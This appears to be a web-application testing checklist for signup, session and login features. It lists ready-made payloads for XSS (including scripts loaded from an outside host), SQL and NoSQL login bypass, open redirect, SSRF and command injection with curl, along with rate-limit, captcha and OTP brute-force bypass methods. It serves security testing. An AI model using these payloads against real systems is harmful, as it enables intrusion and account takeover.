## Registration Feature Testing
- [ ] check for duplicate registrationoverwrite existing user
- [ ] Check for weak password policy
- [ ] Check for reuse existing username
- [ ] weak registration implementation-Allows disposible email addresses
- [ ] Weak registration implementation-Over HTTP
- [ ] Overwrite default web application pages by specially crafted username registrations. ⇒ After registration, does 
		 your profile link appears something as www.tushar.com/tushar?
		 **For testing:** Enter website link.
----------

- [ ] Duplicate registration / Overwrite existing user [[testforduplicateuser]]
- [ ] DOS at Name/Password field in Signup Page. [[testfordospass]]
- [ ] XSS in Email field: `"><svg/onload=confirm(1)>"@xy.com`
- [ ] No rate limit at signup page. [Report](https://hackerone.com/reports/1245529)
- [ ] Insufficient Email Verification [[testforiev]]
- [ ] Registration form on non-HTTPs.
- [ ] Allows disposable mail addresses.
- [ ] Check if application allows easily guessable passwords 123456
- [ ] Check if you can use username same as that of email addresses.
- [ ] check if you can user same password as email.
- [ ] improperly implemented password recovery policy.
- [ ] 

## Session management
- [ ] identify actual session cookie out of bulk cookies in the application.
- [ ] Decode cookies using some standard algo base64, hex, url,etc
- [ ] Modify cookie.session token by 1bit/byte. Then resumbmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not.
- [ ] Check for session cookies and cookie expiration date/time.
- [ ] Identify cookie domain scope
- [ ] Check for HttpOnly flag in cookie
- [ ] Check for Secure flag in cookie if the application is over SSL.
- [ ] Check for session fixation i.e value of session cookie before and after authentication.
- [ ] Replay the session cookie from a diferent effective IP address or system to check whether the server maintains the satate of the machine or not.
- [ ] check for the concurrent login through different machine/IP
- [ ] check if any user pertainig information is stored in cookie value or not if yes, tamper it with other users data.
- [ ] Failure to invalidate Session on (Email Change, 2FA activation)


## Cases to test for
- [ ]  Test for BSQLi identification without getting detected by WAF - 
	- ![](https://pbs.twimg.com/media/D1Dv6nQW0AAFWnG?format=png&name=small)


- [ ] Value overwrite of parameter `nameOfparameter[]` in Email or Password
	- ![](https://i.imgur.com/r9jDgQu.png)

- [ ] Json request?
	- [ ] Input multiple username to cause error
		- {"email":\["userOne","userTwo"\],"password":****}

- [ ] **Login Bypass**
	- [ ] Insert `\` or `||1#` as Email and password
	- [ ] Inset "--" or '--' in Email OR password to bypass auth.
		- username: '--' or "--" 
		- password: '--' or "--"

	- [ ] Insert `[%24ne]` in Email and Password
	- [ ] Insert `&gt` in Password and change Content-Type Header to `application/json`
	- [ ] Insert `_all_docs` or `user[]=_all_docs` in user parameter with undefined password

- [ ] **XSS in Login page**
	- [ ] Try `%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a` in Email parameter.
	- [ ] Insert 50,000+ Charaters or Numbers in **Email** or **Password** to expose sensitive errors exposing sensitive information.
	- [ ] `><script src=//me.xss.ht></script>`
	- [ ] `><img src=//me.xss.ht>`
	- [ ] For the Path try appending `!'><svg/onload=alert('XSS')>` in the Path ex: `https://example.com/login?!'><svg/onload=alert('XSS')>`
- [ ] **XML request?**
	- [ ] Insert XML payload instead of request
		- ![](https://i.imgur.com/p82Iich.png)

- [ ] **SQLi in Login page**
	- [ ] Insert SQLi payloads e.g: 
		- `";WAITFOR DELAY '0.0.20'--`
		- `'/**/or/**/abc!=` in username and password
	- [ ] Insert SQLi payloads e.g
		- `'AND '1'='2`
		- `";WAITFOR DELAY '0.0.20'--`
		- Test them in non standard headers like: X_Forwarded-Host:

- [ ] Open Redirection
	- [ ] If there is `nextURL=` parameter then try:
		- http:3627732462
		- https://www.google.com%ff@www.company.com
		- Other Open Redirect payloads (VikeyLi open redirect) [[NPM Packages vulnerabilties]]
		- For the **same parameter** try `lol';alert(document.domain)//lol` for DOM based XSS
		- At LogOut , Add `dict://me.com:80` 
			- `GET /logout?logout_path=dict://me.com:80 HTTP/1.1`

- [ ] **Remote Code Execution**
	- [ ] Curl as a part of Login
		- ```email=me&password=*****&`curl me.com```

- [ ] Account Takeover
	- [ ] Try valid password and username and then try bruteforce OTP code
	- [ ] Abe to login via OTP? Try changing your email address to someone else email address for ATO
- [ ] Rate Limit
	- [ ] Try To Do **Brute Force By Using IP Rotate Burp Suite Extension** OR **Fireprox To Bypass Rate Limits** That Based On Blocked IP
		- https://www.youtube.com/watch?v=it_V3ig1_4o
	- [ ] Insert `X-Forward-For` or same for two times.
		- ![](https://i.imgur.com/2wK6VSd.png)



- [ ] Captcha Bypass
	- [ ] Change `GET` to `POST`
	- [ ] Remove Captcha parameter
	- [ ] Reuse the Old-captcha
	- [ ] Change `JSON body to Normal Body` and `application/json to application/x-www-form-urlencode` respectively.
	- [ ] Use Non-standard headers
		- ![[login captcha bypass.png]]
	- [ ] If Comany uses `Captcha Image Contains Text` try to Use `Convert Command` AND `Tesseract tool` to extract the Text from the Image.
		1. Download Image
		2. Use command `convert img.png -colorspace gray -threshold 50% imgOUT.png` 
		3. Use command `tesseract imgOUT.png`

- [ ] Do they use http at login portal?
- [ ] Check if the session will expier after logout or not?
- [ ] Privilege escalation
	- **Have 2 different user accounts, one low privileged user and other one with some level of permissions**
	- **Catch the request in BURPSUITE, throw them into a “Repeater tab” replace the cookies of a high level privileged user with low level privileged user, see if it’s a success!**

- [ ] 